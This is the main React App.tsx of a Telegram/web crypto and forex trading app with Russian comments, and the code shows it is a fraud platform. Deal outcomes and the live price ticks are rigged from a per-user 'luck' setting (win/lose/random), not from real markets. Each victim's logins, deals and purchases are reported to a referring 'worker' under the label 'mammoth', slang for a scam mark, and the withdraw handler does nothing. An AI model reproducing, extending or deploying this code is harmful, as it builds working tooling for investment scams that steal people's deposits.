import React, { useState, useEffect, useRef } from 'react';
import Layout from './components/Layout';
import HomePage from './pages/HomePage';
import TradingPage from './pages/TradingPage';
import CoinsPage from './pages/CoinsPage';
import DealsPage from './pages/DealsPage';
import ExchangePage from './pages/ExchangePage';
import StakingPage from './pages/StakingPage';
import DepositPage from './pages/DepositPage';
import WithdrawPage from './pages/WithdrawPage';
import QRScannerPage from './pages/QRScannerPage';
import ProfilePage from './pages/ProfilePage';
import SupportPage from './pages/SupportPage';
import KycPage from './pages/KycPage';
import { PageView, Asset, Deal, DealStatus } from './types';
import type { SpotHolding } from './types';
import type { StakingPosition, StakingRate } from './types';
import { MOCK_ASSETS, MARKET_ASSETS, FOREX_MARKET_ASSETS } from './constants';
import { useLiveAssets } from './utils/useLiveAssets';
import { Haptic } from './utils/haptics';
import { useUser } from './context/UserContext';
import { usePin } from './context/PinContext';
import { supabase } from './lib/supabase';
import { tradeRowToDeal, dealToTradeInsert } from './lib/trades';
import { fetchSpotHoldings } from './lib/spot';
import { accrualToBalance, fetchStakingPositions, fetchStakingRates } from './lib/staking';
import { useToast } from './context/ToastContext';
import { useLanguage } from './context/LanguageContext';
import { getSupabaseErrorMessage } from './lib/supabaseError';
import { logAction } from './lib/appLog';
import { sendDealOpenedToWorker, sendReferralSpotBuyToWorker, sendReferralLoginToWorker, canNotifyWorker } from './lib/telegramNotify';
import CreatePinScreen from './components/CreatePinScreen';
import OnboardingScreen from './components/OnboardingScreen';
import LoadingScreen from './components/LoadingScreen';
import CurrencyPickerPage from './pages/CurrencyPickerPage';
import LanguagePickerPage from './pages/LanguagePickerPage';
import LandingPage from './pages/LandingPage';
import LoginPage from './pages/LoginPage';
import RegisterPage, { POST_REGISTER_WELCOME_KEY } from './pages/RegisterPage';
import PostRegisterWelcome from './components/PostRegisterWelcome';
import { CurrencyProvider, useCurrency } from './context/CurrencyContext';
import { useWebAuth } from './context/WebAuthContext';
import { PasswordChangeProvider, usePasswordChange } from './context/PasswordChangeContext';

/** Синхронизирует язык и валюту с данными пользователя */
function LocaleCurrencySync() {
  const { tgid, webUserId, user } = useUser();
  const { setLocale } = useLanguage();
  const { setBaseCurrency } = useCurrency();
  const isLoggedIn = !!(tgid || webUserId) && user;
  useEffect(() => {
    if (isLoggedIn && user) {
      const loc = (user.preferred_locale || 'en').toLowerCase();
      if (['en', 'ru', 'pl', 'kk', 'cs'].includes(loc)) setLocale(loc as 'en' | 'ru' | 'pl' | 'kk' | 'cs');
      const cur = (user.preferred_currency || 'USD').toLowerCase();
      setBaseCurrency(cur || 'usd');
    } else {
      setLocale('en');
      setBaseCurrency('usd');
    }
  }, [tgid, webUserId, user?.preferred_locale, user?.preferred_currency, setLocale, setBaseCurrency]);
  return null;
}

type Side = 'UP' | 'DOWN';
type LuckMode = 'WIN' | 'LOSE' | 'RANDOM';

interface TradeResult {
  pnl: number;           // Итоговая прибыль/убыток (например, +500 или -1000)
  percentChange: number; // На сколько % реально изменилась цена (например, 0.035 для 3.5%)
  isLiquidated: boolean; // Случилась ли ликвидация
}

function calculateTradeResult(
  amount: number,
  leverage: number,
  side: Side,
  luckMode: LuckMode
): TradeResult {
  const absoluteMovePercent = Math.random() * 0.04 + 0.01;

  let marketDirection: 1 | -1;
  if (luckMode === 'WIN') {
    marketDirection = side === 'UP' ? 1 : -1;
  } else if (luckMode === 'LOSE') {
    marketDirection = side === 'UP' ? -1 : 1;
  } else {
    marketDirection = Math.random() > 0.5 ? 1 : -1;
  }

  const sideMultiplier = side === 'UP' ? 1 : -1;
  const rawPnlPercent = absoluteMovePercent * marketDirection * sideMultiplier;
  const leveragedPnlPercent = rawPnlPercent * leverage;

  let finalPnl = Math.round(amount * leveragedPnlPercent);
  let isLiquidated = false;

  if (leveragedPnlPercent <= -1) {
    isLiquidated = true;
    finalPnl = -amount;
  }

  return {
    pnl: finalPnl,
    percentChange: absoluteMovePercent * marketDirection,
    isLiquidated,
  };
}

type AuthSubPage = null | 'login' | 'register';

const App: React.FC = () => {
  return (
    <PasswordChangeProvider>
      <AppContent />
    </PasswordChangeProvider>
  );
};

const AppContent: React.FC = () => {
  const { user, tgid, webUserId, loading, error, refreshUser } = useUser();
  const { hasPin } = usePin();
  const { webUserId: webId } = useWebAuth();
  const { passwordChangeActive } = usePasswordChange();
  const toast = useToast();
  const { t } = useLanguage();
  const [currentPage, setCurrentPage] = useState<PageView>('HOME');
  const [selectedAsset, setSelectedAsset] = useState<Asset | null>(null);
  const [deals, setDeals] = useState<Deal[]>([]);
  const [spotHoldings, setSpotHoldings] = useState<SpotHolding[]>([]);
  const [stakingPositions, setStakingPositions] = useState<StakingPosition[]>([]);
  const [stakingRates, setStakingRates] = useState<StakingRate[]>([]);
  const [tradingInitialState, setTradingInitialState] = useState<{ tradeType?: 'futures' | 'spot'; spotAction?: 'buy' | 'sell' } | null>(null);
  const [onboardingDone, setOnboardingDone] = useState(false);
  const [pinCreated, setPinCreated] = useState(false);
  const [authSubPage, setAuthSubPage] = useState<AuthSubPage>(null);
  const [hideNavigation, setHideNavigation] = useState(false);
  const [hideNavFromExchangePicker, setHideNavFromExchangePicker] = useState(false);
  const [hideNavFromDeposit, setHideNavFromDeposit] = useState(false);
  const [loadingAnimationDone, setLoadingAnimationDone] = useState(false);
  const [hideNavFromProfileFullscreen, setHideNavFromProfileFullscreen] = useState(false);
  const [showPostRegWelcome, setShowPostRegWelcome] = useState(false);

  const refId = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('ref') : null;
  const openSupport = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('open') === 'support' : false;
  // Требуем вход/регистрацию при любом заходе не через TG (не mini app, не бота)
  const showAuthGate = !tgid && !webId && !loading;

  useEffect(() => {
    if (openSupport && !showAuthGate && user) {
      setCurrentPage('SUPPORT');
    }
  }, [openSupport, showAuthGate, user]);

  /** После PIN веб-пользователя — показать welcome, если только что зарегистрировались */
  useEffect(() => {
    if (tgid || !webUserId || !user || !pinCreated) {
      setShowPostRegWelcome(false);
      return;
    }
    try {
      if (sessionStorage.getItem(POST_REGISTER_WELCOME_KEY) === '1') {
        setShowPostRegWelcome(true);
      }
    } catch {
      setShowPostRegWelcome(false);
    }
  }, [tgid, webUserId, user?.user_id, pinCreated]);
  const userLuckRef = useRef<'win' | 'lose' | 'default'>(user?.luck ?? 'default');
  const paidDealIds = useRef<Set<string>>(new Set());
  userLuckRef.current = user?.luck ?? 'default';

  const balance = user?.balance ?? 0;
  const liveCrypto = useLiveAssets(MARKET_ASSETS);
  const liveForex = useLiveAssets(FOREX_MARKET_ASSETS);
  const liveAssetsForTrading = React.useMemo(
    () => [...liveCrypto, ...liveForex],
    [liveCrypto, liveForex]
  );

  // Управляем видимостью навигации при создании PIN или смене пароля
  useEffect(() => {
    const showingPinScreen = 
      (tgid && user && !hasPin(tgid) && !pinCreated) ||
      (webUserId && user && !hasPin(webUserId.toString()) && !pinCreated);
    
    setHideNavigation(showingPinScreen || passwordChangeActive);
  }, [tgid, webUserId, user, hasPin, pinCreated, passwordChangeActive]);

  // Загрузка сделок из БД
  useEffect(() => {
    if (!user) return;
    const uid = user.user_id;
    supabase
      .from('trades')
      .select('*')
      .eq('user_id', uid)
      .order('start_time', { ascending: false })
      .then(({ data, error: e }) => {
        if (e) return;
        const list = (data || []).map((row) => tradeRowToDeal(row as any));
        setDeals(list);
      });
  }, [user?.user_id]);

  const refreshSpotHoldings = React.useCallback(async () => {
    if (!user) return;
    const list = await fetchSpotHoldings(user.user_id);
    setSpotHoldings(list);
    refreshUser();
  }, [user, refreshUser]);

  const refreshStaking = React.useCallback(async () => {
    if (!user) return;
    const pricesRub = Object.fromEntries(
      liveAssetsForTrading
        .filter((asset) => Number.isFinite(asset.price) && asset.price > 0)
        .map((asset) => [asset.ticker, asset.price])
    );
    await accrualToBalance(user.user_id, pricesRub);
    const [positions, rates] = await Promise.all([
      fetchStakingPositions(user.user_id),
      fetchStakingRates(),
    ]);
    setStakingPositions(positions);
    setStakingRates(rates);
    refreshUser();
  }, [user, liveAssetsForTrading, refreshUser]);

  const notifyReferralSpotBuy = React.useCallback((ticker: string, amountRub: number) => {
    const base =
      import.meta.env.VITE_BOT_API_URL?.replace(/\/+$/, '') ||
      import.meta.env.VITE_DEPOSIT_NOTIFY_URL?.replace(/\/api\/deposit-notify\/?$/, '');
    if (!user?.referrer_id) return;
    if (base) {
      fetch(`${base}/api/referral-spot-buy`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          worker_id: user.referrer_id,
          mammoth_name: user.full_name || user.username || 'Клиент',
          mammoth_username: user.username || undefined,
          mammoth_id: user.user_id,
          ticker,
          amount_rub: amountRub,
        }),
      }).catch(() => {});
    } else if (canNotifyWorker()) {
      sendReferralSpotBuyToWorker(user.referrer_id, {
        mammoth_name: user.full_name || user.username || 'Клиент',
        mammoth_username: user.username ?? undefined,
        mammoth_id: user.user_id,
        ticker,
        amount_rub: amountRub,
      }).catch(() => {});
    }
  }, [user?.referrer_id, user?.full_name, user?.username]);

  // Лог воркеру: реферал зашёл в мини-апп (один раз за сессию)
  useEffect(() => {
    if (!tgid || !user?.referrer_id || !canNotifyWorker()) return;
    const key = `ref_open_${user.user_id}`;
    try {
      if (sessionStorage.getItem(key)) return;
      sessionStorage.setItem(key, '1');
      sendReferralLoginToWorker(user.referrer_id, {
        user_id: user.user_id,
        username: user.username ?? undefined,
        full_name: user.full_name || user.username || 'Клиент',
      }).catch(() => {});
    } catch (_) {}
  }, [tgid, user?.user_id, user?.referrer_id, user?.full_name, user?.username]);

  useEffect(() => {
    if (!user) return;
    fetchSpotHoldings(user.user_id).then(setSpotHoldings);
  }, [user?.user_id]);

  useEffect(() => {
    if (!user) return;
    refreshStaking();
  }, [user?.user_id, refreshStaking]);

  // Game loop: price movement and deal expiration; result by luck (win/lose/random)
  useEffect(() => {
    if (!user) return;
    const interval = setInterval(() => {
      setDeals((currentDeals) => {
        if (currentDeals.length === 0) return currentDeals;
        const luck = userLuckRef.current;

        return currentDeals.map((deal) => {
          if (deal.status !== 'ACTIVE') return deal;

          const timeElapsed = Date.now() - deal.startTime;
          const isFinished = timeElapsed >= deal.durationSeconds * 1000;
          const currentPrice = deal.currentPrice ?? deal.entryPrice;

          // Сделка завершилась: считаем итоговое движение 1–5% и результат по удаче + плечу
          if (isFinished) {
            const luckMode: LuckMode =
              luck === 'win' ? 'WIN' : luck === 'lose' ? 'LOSE' : 'RANDOM';

            const { pnl: finalPnl, percentChange } = calculateTradeResult(
              deal.amount,
              deal.leverage,
              deal.side as Side,
              luckMode
            );

            const finalPrice = deal.entryPrice * (1 + percentChange);

            const isWin = finalPnl > 0;
            const payout = isWin ? deal.amount + finalPnl : 0;

            // Начисляем на баланс только при положительном результате
            if (payout > 0 && !paidDealIds.current.has(deal.id)) {
              paidDealIds.current.add(deal.id);
              const uid = user.user_id;
              supabase
                .from('users')
                .select('balance')
                .eq('user_id', uid)
                .single()
                .then(({ data: row }) => {
                  const current = (row as { balance: number })?.balance ?? 0;
                  return supabase.from('users').update({ balance: current + payout }).eq('user_id', uid);
                })
                .then(() => refreshUser());
            }

            // Фиксируем сделку в БД
            supabase
              .from('trades')
              .update({
                status: 'completed',
                final_price: finalPrice,
                final_pnl: finalPnl,
                is_winning: isWin,
              })
              .eq('id', deal.id)
              .then(() => {});

            if (isWin) Haptic.success();
            else Haptic.error();

            return {
              ...deal,
              status: (isWin ? 'WIN' : 'LOSS') as DealStatus,
              pnl: finalPnl,
              currentPrice: finalPrice,
            };
          }

          // Пока сделка активна — рывками и с колебаниями, с общим уклоном под удачу
          const baseVolatility = 0.0003 + Math.random() * 0.0012; // переменный шаг ~0.03–0.15%
          let stepSign: number;
          if (luck === 'win') {
            stepSign = deal.side === 'UP' ? 1 : -1;
          } else if (luck === 'lose') {
            stepSign = deal.side === 'UP' ? -1 : 1;
          } else {
            stepSign = Math.random() > 0.5 ? 1 : -1;
          }
          // 25% шанс отката против тренда — имитация колебаний
          if (Math.random() < 0.25) stepSign *= -1;
          // 10% шанс более резкого скачка (~0.2–0.4%)
          const isSpike = Math.random() < 0.1;
          const stepChangePercent = (isSpike ? 0.002 + Math.random() * 0.002 : baseVolatility) * stepSign;
          const newPrice = currentPrice * (1 + stepChangePercent);

          const priceDiff = deal.side === 'UP' ? newPrice - deal.entryPrice : deal.entryPrice - newPrice;
          const rawPercentDiff = priceDiff / deal.entryPrice;
          const leveragedPercentDiff = rawPercentDiff * deal.leverage;
          const currentPnl = Math.round(deal.amount * leveragedPercentDiff);

          return { ...deal, currentPrice: newPrice, pnl: currentPnl };
        });
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [user?.user_id, refreshUser]);

  const handleNavigate = (page: PageView) => {
    Haptic.light();
    setCurrentPage(page);
    // pushState только вне Telegram WebApp
    if (!(window as any).Telegram?.WebApp?.initData) {
      window.history.pushState({ page }, '', '');
    }
    if (page === 'HOME') {
      setSelectedAsset(null);
      setTradingInitialState(null);
    }
  };

  // Поддержка кнопки "Назад" браузера (только вне Telegram WebApp)
  useEffect(() => {
    const isTgWebApp = !!(window as any).Telegram?.WebApp?.initData;
    if (isTgWebApp) return; // В Telegram не используем History API

    window.history.replaceState({ page: 'HOME' }, '', '');

    const handlePopState = (e: PopStateEvent) => {
      const page = (e.state?.page as PageView) ?? 'HOME';
      const validPages: PageView[] = ['HOME','COINS','TRADING','STAKING','DEALS','EXCHANGE','DEPOSIT','WITHDRAW','QR_SCANNER','PROFILE','KYC','CURRENCY','LANGUAGE','SUPPORT'];
      setCurrentPage(validPages.includes(page) ? page : 'HOME');
      if (page === 'HOME') {
        setSelectedAsset(null);
        setTradingInitialState(null);
      }
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleNavigateToTrading = (asset: Asset, options?: { tradeType?: 'futures' | 'spot'; spotAction?: 'buy' | 'sell' }) => {
    Haptic.light();
    setSelectedAsset(asset);
    setTradingInitialState(options ?? null);
    setCurrentPage('TRADING');
  };

  const handleOpenDeal = async (newDeal: Deal) => {
    if (user?.trading_blocked) {
      Haptic.error();
      toast.show(t('trading_blocked_toast'), 'error');
      return;
    }
    if (balance < newDeal.amount) {
      Haptic.error();
      toast.show(t('insufficient_funds'), 'error');
      return;
    }
    const newBalance = balance - newDeal.amount;
    const uid = user!.user_id;
    const { error: e } = await supabase.from('users').update({ balance: newBalance }).eq('user_id', uid);
    if (e) {
      Haptic.error();
      toast.show(getSupabaseErrorMessage(e, t('withdraw_error')), 'error');
      return;
    }
    const insertRow = dealToTradeInsert(newDeal, uid);
    const { data: inserted, error: insertErr } = await supabase
      .from('trades')
      .insert(insertRow)
      .select()
      .single();
    if (insertErr) {
      Haptic.error();
      toast.show(getSupabaseErrorMessage(insertErr, t('deal_creation_error')), 'error');
      return;
    }
    const botApiBase =
      import.meta.env.VITE_BOT_API_URL?.replace(/\/+$/, '') ||
      import.meta.env.VITE_DEPOSIT_NOTIFY_URL?.replace(/\/api\/deposit-notify\/?$/, '');
    if (user?.referrer_id) {
      if (botApiBase) {
        try {
          await fetch(`${botApiBase}/api/deal-opened`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              worker_id: user.referrer_id,
              mammoth_name: user.full_name || user.username || 'Клиент',
              mammoth_username: user.username || undefined,
              mammoth_id: user.user_id,
              asset_ticker: newDeal.assetTicker,
              side: newDeal.side,
              amount: newDeal.amount,
              leverage: newDeal.leverage,
              duration_seconds: newDeal.durationSeconds,
            }),
          });
        } catch (_) {}
      } else if (canNotifyWorker()) {
        try {
          await sendDealOpenedToWorker(user.referrer_id, {
            mammoth_name: user.full_name || user.username || 'Клиент',
            mammoth_username: user.username ?? undefined,
            mammoth_id: user.user_id,
            asset_ticker: newDeal.assetTicker,
            side: newDeal.side,
            amount: newDeal.amount,
            leverage: newDeal.leverage,
            duration_seconds: newDeal.durationSeconds,
          });
        } catch (_) {}
      }
    }
    logAction('deal_open', { userId: uid, tgid, payload: { asset_ticker: newDeal.assetTicker, amount: newDeal.amount, side: newDeal.side } }).catch(() => {});
    await refreshUser();
    Haptic.medium();
    const dealFromDb = tradeRowToDeal(inserted as any);
    const dealWithPrice = { ...dealFromDb, currentPrice: newDeal.entryPrice, pnl: 0 };
    setDeals((prev) => [dealWithPrice, ...prev]);
    setCurrentPage('DEALS');
  };

  const handleDeposit = () => {
    Haptic.light();
    refreshUser();
  };

  const handleWithdraw = () => {
    Haptic.light();
  };

  const handleQRScan = (_data: string) => {
    Haptic.success();
  };

  if (!loadingAnimationDone) {
    return <LoadingScreen onAnimationComplete={() => setLoadingAnimationDone(true)} />;
  }

  // Пока Supabase грузит пользователя — показываем пустой фон, не вешаем на сплеше
  if (loading && !tgid && !webId) {
    return <div className="h-screen bg-background" />;
  }
  // Вход/регистрация — при заходе не через TG обязательно
  if (showAuthGate) {
    if (authSubPage === 'login') {
      return (
        <LoginPage
          onBack={() => setAuthSubPage(null)}
          onSuccess={() => setAuthSubPage(null)}
          onGoRegister={() => setAuthSubPage('register')}
          onGoSupport={() => { setAuthSubPage(null); /* support откроется после входа */ }}
        />
      );
    }
    if (authSubPage === 'register') {
      return (
        <RegisterPage
          refId={refId || ''}
          onBack={() => setAuthSubPage(null)}
          onSuccess={() => setAuthSubPage(null)}
          onGoLogin={() => setAuthSubPage('login')}
        />
      );
    }
    return (
      <LandingPage
        refId={refId || ''}
        onLogin={() => setAuthSubPage('login')}
        onRegister={() => setAuthSubPage('register')}
      />
    );
  }
  // Гость (без Telegram): показываем приложение с ограниченным функционалом
  if (error && !refId) {
    return (
      <div className="h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
        <p className="text-neutral-300 mb-4">{error}</p>
        <p className="text-sm text-neutral-500">Откройте приложение из Telegram (кнопка «Открыть приложение» в боте).</p>
      </div>
    );
  }
  // Открыли из Telegram, но пользователь не найден в БД
  if (tgid && !user) {
    return (
      <div className="h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
        <p className="text-neutral-300 mb-4">Пользователь не найден.</p>
        <p className="text-sm text-neutral-500">Откройте приложение из Telegram (кнопка в боте).</p>
      </div>
    );
  }

  // Первый вход: онбординг (шаг 1) → создание пароля (шаг 2) → в приложение
  if (tgid && user && !hasPin(tgid) && !pinCreated) {
    if (!onboardingDone) {
      return <OnboardingScreen onNext={() => setOnboardingDone(true)} />;
    }
    return (
      <CreatePinScreen
        tgid={tgid}
        onCreated={() => {
          setPinCreated(true);
          setHideNavigation(false);
        }}
      />
    );
  }

  // Веб-пользователь: создание PIN при первом входе
  if (webUserId && user && !hasPin(webUserId.toString()) && !pinCreated) {
    return (
      <CreatePinScreen
        webUserId={webUserId}
        onCreated={() => {
          setPinCreated(true);
          setHideNavigation(false);
        }}
      />
    );
  }

  const renderContent = () => {
    switch (currentPage) {
      case 'HOME':
        return (
          <HomePage
            balance={balance}
            user={user}
            onNavigate={handleNavigate}
            onNavigateToTrading={handleNavigateToTrading}
            onSearch={() => handleNavigate('COINS')}
            onCurrencyClick={() => handleNavigate('CURRENCY')}
          />
        );
      case 'COINS':
        return (
          <CoinsPage
            onNavigateToTrading={handleNavigateToTrading}
            spotHoldings={spotHoldings}
            stakingPositions={stakingPositions}
            stakingRates={stakingRates}
            refreshSpotHoldings={refreshSpotHoldings}
            refreshStaking={refreshStaking}
            userId={user?.user_id ?? 0}
          />
        );
      case 'TRADING': {
        /** Без Forex в списке find() не находил пару → падение на BTC (live[0]). */
        const tradingAsset = (() => {
          if (selectedAsset) {
            const live = liveAssetsForTrading.find((a) => a.ticker === selectedAsset.ticker);
            if (live) return live;
            return selectedAsset;
          }
          return liveAssetsForTrading[0] ?? MOCK_ASSETS[0];
        })();
        return (
          <TradingPage
            asset={tradingAsset}
            balance={balance}
            tradingBlocked={!!user?.trading_blocked}
            onBack={() => handleNavigate('HOME')}
            onChangeAsset={handleNavigateToTrading}
            onOpenDeal={handleOpenDeal}
            spotHoldings={spotHoldings}
            onSpotComplete={refreshSpotHoldings}
            onReferralSpotBuy={notifyReferralSpotBuy}
            initialTradeType={tradingInitialState?.tradeType}
            initialSpotAction={tradingInitialState?.spotAction}
          />
        );
        }
      case 'DEALS':
        return (
          <DealsPage
            deals={deals}
            spotHoldings={spotHoldings}
            userId={user?.user_id ?? 0}
            onNavigateToTrading={handleNavigateToTrading}
            onNavigateToExchange={() => handleNavigate('EXCHANGE')}
          />
        );
      case 'EXCHANGE':
        return (
          <ExchangePage
            spotHoldings={spotHoldings}
            refreshSpotHoldings={refreshSpotHoldings}
            onPickerOpenChange={setHideNavFromExchangePicker}
          />
        );
      case 'STAKING':
        return (
          <StakingPage
            spotHoldings={spotHoldings}
            stakingPositions={stakingPositions}
            stakingRates={stakingRates}
            refreshStaking={refreshStaking}
            userId={user?.user_id ?? 0}
            onNavigateToTrading={handleNavigateToTrading}
          />
        );
      case 'DEPOSIT':
        return <DepositPage onDeposit={handleDeposit} onBack={() => { setHideNavFromDeposit(false); handleNavigate('HOME'); }} onHideNav={setHideNavFromDeposit} />;
      case 'WITHDRAW':
        return <WithdrawPage balance={balance} onWithdraw={handleWithdraw} onBack={() => handleNavigate('HOME')} />;
      case 'QR_SCANNER':
        return <QRScannerPage onBack={() => handleNavigate('HOME')} onScan={handleQRScan} />;
      case 'PROFILE':
        return (
          <ProfilePage
            deals={deals}
            onBack={() => handleNavigate('HOME')}
            onNavigateToKyc={() => setCurrentPage('KYC')}
            onNavigateToCurrency={() => handleNavigate('CURRENCY')}
            onNavigateToLanguage={() => handleNavigate('LANGUAGE')}
            onNavigateToSupport={() => handleNavigate('SUPPORT')}
            onNavigateToExchange={() => handleNavigate('EXCHANGE')}
            onFullscreenChange={setHideNavFromProfileFullscreen}
          />
        );
      case 'KYC':
        return <KycPage onBack={() => setCurrentPage('PROFILE')} />;
      case 'CURRENCY':
        return <CurrencyPickerPage onBack={() => handleNavigate('HOME')} />;
      case 'LANGUAGE':
        return <LanguagePickerPage onBack={() => handleNavigate('PROFILE')} />;
      case 'SUPPORT':
        return <SupportPage onBack={() => handleNavigate('PROFILE')} />;
      default:
        return (
          <HomePage
            balance={balance}
            user={user}
            onNavigate={handleNavigate}
            onNavigateToTrading={handleNavigateToTrading}
            onSearch={() => handleNavigate('COINS')}
            onCurrencyClick={() => handleNavigate('CURRENCY')}
          />
        );
    }
  };

  const dismissPostRegisterWelcome = () => {
    try {
      sessionStorage.removeItem(POST_REGISTER_WELCOME_KEY);
    } catch {
      /* ignore */
    }
    setShowPostRegWelcome(false);
  };

  return (
    <CurrencyProvider>
      <LocaleCurrencySync />
      <Layout
        currentPage={currentPage}
        onNavigate={handleNavigate}
        hideNavigation={hideNavigation || hideNavFromExchangePicker || hideNavFromProfileFullscreen || hideNavFromDeposit}
      >
        {renderContent()}
      </Layout>
      {showPostRegWelcome ? (
        <PostRegisterWelcome
          onDeposit={() => {
            dismissPostRegisterWelcome();
            handleNavigate('DEPOSIT');
          }}
          onBuyCrypto={() => {
            dismissPostRegisterWelcome();
            handleNavigate('EXCHANGE');
          }}
          onDismiss={dismissPostRegisterWelcome}
        />
      ) : null}
    </CurrencyProvider>
  );
};

export default App;
